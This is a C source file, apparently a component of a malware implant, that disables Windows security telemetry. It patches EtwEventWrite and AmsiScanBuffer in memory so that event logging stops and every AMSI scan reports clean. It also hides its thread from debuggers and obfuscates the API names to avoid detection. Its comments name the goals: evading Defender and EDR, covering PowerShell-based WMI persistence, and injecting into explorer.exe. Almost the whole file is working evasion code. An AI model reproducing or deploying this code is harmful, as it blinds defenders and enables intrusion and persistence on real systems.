/**
 * === ETW + AMSI Runtime Bypass + Reflective Loader ===
 * 
 * ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface)
 * are patched before any suspicious activity to prevent runtime behavioral
 * detection by Defender/EDR.
 * 
 * Reflective loader injects our full PE into an existing process (explorer.exe)
 * without CreateProcess — avoiding the heavily signatured CREATE_SUSPENDED flag.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "obf.h"

/* Encoded strings for ETW/AMSI APIs */
/* "EtwEventWrite" */
static unsigned char enc_etweventwrite[] = {
    0x3f, 0x0e, 0x0d, 0x3f, 0x0c, 0x1f, 0x14, 0x0e,
    0x2d, 0x08, 0x13, 0x0e, 0x1f
};
/* "AmsiScanBuffer" */
static unsigned char enc_amsiscanbuffer[] = {
    0x3b, 0x17, 0x09, 0x13, 0x29, 0x19, 0x1b, 0x14,
    0x38, 0x0f, 0x1c, 0x1c, 0x1f, 0x08
};
/* "AmsiInitialize" */
static unsigned char enc_amsiinit[] = {
    0x3b, 0x17, 0x09, 0x13, 0x33, 0x14, 0x13, 0x0e,
    0x13, 0x1b, 0x16, 0x13, 0x00, 0x1f
};
/* "amsi.dll" */
static unsigned char enc_amsidll[] = {0x1b, 0x17, 0x09, 0x13, 0x54, 0x1e, 0x16, 0x16};
/* "NtSetInformationThread" */
static unsigned char enc_ntsetinfothread[] = {
    0x34, 0x0e, 0x29, 0x1f, 0x0e, 0x33, 0x14, 0x1c,
    0x15, 0x08, 0x17, 0x1b, 0x0e, 0x13, 0x15, 0x14,
    0x2e, 0x12, 0x08, 0x1f, 0x1b, 0x1e
};

char* obf_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)-1); }
char* obf_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)-1); }
char* obf_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)-1); }
char* obf_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)-1); }
char* obf_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)-1); }

/* === ETW Bypass ===
 * Patch EtwEventWrite in ntdll.dll to return immediately.
 * This stops Defender/EDR from receiving security event telemetry.
 */
void obf_bypass_etw(void) {
    char *ntdll_name = obf_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, obf_etweventwrite());
    if (!pEtwEventWrite) return;

    /* Patch: ret (0xC3) — function returns immediately, no events logged */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}

/* === AMSI Bypass ===
 * Patch AmsiScanBuffer in amsi.dll to return S_OK (0), meaning "clean".
 * This prevents AMSI from scanning our PowerShell commands (e.g. WMI persistence).
 */
void obf_bypass_amsi(void) {
    char *amsi_name = obf_amsidll();
    HMODULE hAmsi = LoadLibraryA(amsi_name);
    if (!hAmsi) return;

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, obf_amsiscanbuffer());
    if (!pAmsiScanBuffer) return;

    /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
     * Returns 0 (S_OK = clean) regardless of what was scanned */
    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
}

/* === Thread Hide From Debugger (bonus anti-EDR) ===
 * Hides current thread from ETW/debugger using NtSetInformationThread.
 */
void obf_hide_thread(void) {
    char *ntdll_name = obf_ntdll();
    HMODULE hNtdll = GetModuleHandleA(ntdll_name);
    if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
    if (!hNtdll) return;

    typedef NTSTATUS (WINAPI *NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);
    NtSetInfoThread_t pNtSetInfoThread = (NtSetInfoThread_t)GetProcAddress(hNtdll, obf_ntsetinfothread());
    if (!pNtSetInfoThread) return;

    ULONG hide = 1;
    pNtSetInfoThread(GetCurrentThread(), 0x11, &hide, sizeof(hide)); /* ThreadHideFromDebugger */
}
